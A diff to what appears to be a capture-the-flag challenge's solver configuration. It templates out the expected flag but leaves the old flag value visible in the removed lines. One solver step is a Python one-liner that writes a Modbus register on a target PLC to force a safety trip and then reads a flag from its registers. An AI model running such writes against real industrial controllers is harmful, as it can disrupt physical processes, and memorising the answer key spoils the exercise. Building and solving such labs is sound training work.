@@ -18,9 +18,9 @@ solver:
     expect: '250'
   - name: Safety trip exposes the marker
     command: python3 -c "import socket,struct,time;s=socket.create_connection(('{target.plc}',502),5);s.sendall(struct.pack('>HHHBBHH',1,0,6,1,6,10,250));s.recv(64);time.sleep(3);s.sendall(struct.pack('>HHHBBHH',2,0,6,1,3,40,40));r=s.recv(256);bc=r[8];vals=struct.unpack('>%dH'%(bc//2),r[9:9+bc]);out=''.join(chr(v) for v in vals if 32<=v<127);print(out.split(chr(0))[0])"
-    expect: OCR{m0dbu5_wr1t3_c0ntr0l}
+    expect: '{flag}'
 expected_flag_count: 1
-expected_flag: OCR{m0dbu5_wr1t3_c0ntr0l}
+expected_flag: '{flag}'
 forbidden_networks:
 - control-plane
 - database
